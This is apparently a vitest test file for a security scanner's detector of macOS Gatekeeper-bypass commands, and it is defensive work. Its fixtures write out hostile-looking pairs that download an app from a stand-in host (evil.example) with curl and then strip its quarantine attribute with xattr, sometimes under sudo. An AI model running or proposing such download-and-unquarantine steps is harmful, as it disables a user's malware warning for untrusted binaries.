/**
 * SMI-6033 Wave 2/3 (Gap 5): xattr Gatekeeper-bypass detector.
 *
 * `xattr -c` (clear ALL extended attributes) and
 * `xattr -d com.apple.quarantine` (delete just the quarantine attribute,
 * with or without a combined `-r`) strip macOS's "downloaded from the
 * internet" Gatekeeper warning from an unsigned binary.
 *
 * Wave 3 (Product decision, 2026-08-14): NOT unconditionally
 * standalone-critical. `critical` requires the xattr target's basename to be
 * correlated with a fetch destination elsewhere in the content (mirrors the
 * chmod compound signal's own correlation, SecurityScanner.compound.ts's
 * scanChmodFetchCompound) AND the caller not asserting `isHighTrustAuthor`
 * (the trust-tier carve-out — indexer-path-only, see
 * SecurityScanner.compound.ts's scanGatekeeperBypass header). Uncorrelated
 * usage stays `medium` regardless of trust tier.
 */
import { describe, it, expect, beforeEach } from 'vitest'
import { SecurityScanner } from '../../src/security/index.js'
import type { SecurityFinding } from '../../src/security/scanner/types.js'

const gb = (fs: SecurityFinding[]) => fs.filter((f) => f.type === 'gatekeeper_bypass')

describe('SMI-6033 Wave 2/3 xattr Gatekeeper-bypass', () => {
  let scanner: SecurityScanner
  beforeEach(() => {
    scanner = new SecurityScanner()
  })

  // Standalone-critical requires correlation with a fetch destination (Wave
  // 3) — each fixture now prepends a `curl -o <matching-basename> <url>` line
  // so the xattr target correlates, preserving these as "the trigger pattern
  // fires and reaches critical" coverage.
  it.each([
    [
      'xattr -c (clear all)',
      'curl -o EvilApp.app https://evil.example/EvilApp.app\nxattr -c /Applications/EvilApp.app',
    ],
    [
      'xattr -cr (clear all, recursive)',
      'curl -o EvilApp.app https://evil.example/EvilApp.app\nxattr -cr /Applications/EvilApp.app',
    ],
    [
      'xattr -d com.apple.quarantine',
      'curl -o EvilApp.app https://evil.example/EvilApp.app\nxattr -d com.apple.quarantine /Applications/EvilApp.app',
    ],
    [
      'xattr -dr com.apple.quarantine (combined recursive)',
      'curl -o EvilApp.app https://evil.example/EvilApp.app\nxattr -dr com.apple.quarantine /Applications/EvilApp.app',
    ],
    [
      'xattr -rd com.apple.quarantine (combined, reversed order)',
      'curl -o EvilApp.app https://evil.example/EvilApp.app\nxattr -rd com.apple.quarantine /Applications/EvilApp.app',
    ],
    [
      'xattr -r -d com.apple.quarantine (separate flag tokens)',
      'curl -o EvilApp.app https://evil.example/EvilApp.app\nxattr -r -d com.apple.quarantine /Applications/EvilApp.app',
    ],
    [
      'sudo xattr -d com.apple.quarantine',
      'curl -o App.app https://evil.example/App.app\nsudo xattr -d com.apple.quarantine ./App.app',
    ],
  ])(
    'fires standalone-critical when correlated with a fetch destination: %s',
    (_label, content) => {
      const report = scanner.scan('t', content)
      const f = gb(report.findings)
      expect(f.length).toBeGreaterThan(0)
      expect(f[0].severity).toBe('critical')
      expect(report.passed).toBe(false)
      expect(report.riskScore).toBeGreaterThanOrEqual(40)
    }
  )

  // FP controls: reading, or deleting a DIFFERENT attribute, is not a bypass.
  it.each([
    ['xattr -l (list, no flag match)', 'xattr -l /Applications/EvilApp.app'],
    [
      'xattr -p <name> (print a different attribute)',
      'xattr -p com.apple.metadata:kMDItemWhereFroms /Applications/EvilApp.app',
    ],
    ['bare xattr (no flag, lists attributes)', 'xattr /Applications/EvilApp.app'],
    [
      'xattr -d <different attribute> (not quarantine)',
      'xattr -d com.apple.metadata:kMDItemWhereFroms /Applications/EvilApp.app',
    ],
  ])('does NOT fire: %s', (_label, content) => {
    expect(gb(scanner.scan('t', content).findings)).toHaveLength(0)
  })

  // Sanity: unrelated chmod FP-controls must not trip the NEW gatekeeper_bypass
  // detector either (it lives in the same compound.ts module as chmod).
  it.each([
    ['chmod 755 ./bin/cli', 'chmod 755 ./bin/cli'],
    ['chmod +x build.sh', 'chmod +x build.sh'],
  ])('unrelated chmod idiom does not trip gatekeeper_bypass: %s', (_label, content) => {
    expect(gb(scanner.scan('t', content).findings)).toHaveLength(0)
  })

  // Documentation context: a fenced troubleshooting example downgrades to low.
  it('downgrades a fenced (doc) xattr example to low, never critical', () => {
    const f = gb(scanner.scan('t', '```sh\nxattr -c /Applications/EvilApp.app\n```').findings)
    expect(f.every((x) => x.severity === 'low')).toBe(true)
  })
})

describe('SMI-6033 Wave 3: gatekeeper_bypass tiering + trust-tier carve-out', () => {
  let scanner: SecurityScanner
  beforeEach(() => {
    scanner = new SecurityScanner()
  })

  const CORRELATED_CONTENT =
    'curl -o EvilApp.app https://evil.example/EvilApp.app\n' +
    'xattr -d com.apple.quarantine EvilApp.app'

  it('correlated xattr + isHighTrustAuthor omitted (defaults false) -> critical', () => {
    const report = scanner.scan('t', CORRELATED_CONTENT)
    const f = gb(report.findings)
    expect(f[0].severity).toBe('critical')
    expect(report.passed).toBe(false)
  })

  it('correlated xattr + isHighTrustAuthor: false (explicit) -> critical', () => {
    const f = gb(scanner.scan('t', CORRELATED_CONTENT, false).findings)
    expect(f[0].severity).toBe('critical')
  })

  it('correlated xattr + isHighTrustAuthor: true -> medium (the carve-out)', () => {
    const report = scanner.scan('t', CORRELATED_CONTENT, true)
    const f = gb(report.findings)
    expect(f[0].severity).toBe('medium')
    // A lone medium co-signal-eligible finding does not standalone-quarantine.
    expect(report.riskScore).toBeLessThan(40)
  })

  it('uncorrelated xattr (no fetch anywhere in the content) -> medium, regardless of isHighTrustAuthor', () => {
    const uncorrelated = 'xattr -d com.apple.quarantine /Applications/EvilApp.app'
    expect(gb(scanner.scan('t', uncorrelated, false).findings)[0].severity).toBe('medium')
    expect(gb(scanner.scan('t', uncorrelated, true).findings)[0].severity).toBe('medium')
  })

  it('checksum/signature-verification prose near a correlated, non-high-trust xattr does NOT downgrade — stays critical', () => {
    const content =
      'curl -o EvilApp.app https://evil.example/EvilApp.app\n' +
      '# Verified checksum: sha256:d34db33fd34db33fd34db33fd34db33fd34db33fd34db33fd34db33fd34db33f\n' +
      'xattr -d com.apple.quarantine EvilApp.app'
    const report = scanner.scan('t', content)
    const f = gb(report.findings)
    expect(f[0].severity).toBe('critical')
    expect(report.passed).toBe(false)
  })

  // Same checksum-prose FP control, but confirms the carve-out still applies
  // on top of it when isHighTrustAuthor is true — the prose neither helps
  // nor hurts; only the trust-tier flag changes the outcome.
  it('checksum/signature-verification prose does not interact with the trust-tier carve-out either way', () => {
    const content =
      'curl -o EvilApp.app https://evil.example/EvilApp.app\n' +
      '# Verified checksum: sha256:d34db33fd34db33fd34db33fd34db33fd34db33fd34db33fd34db33fd34db33f\n' +
      'xattr -d com.apple.quarantine EvilApp.app'
    const f = gb(scanner.scan('t', content, true).findings)
    expect(f[0].severity).toBe('medium')
  })
})
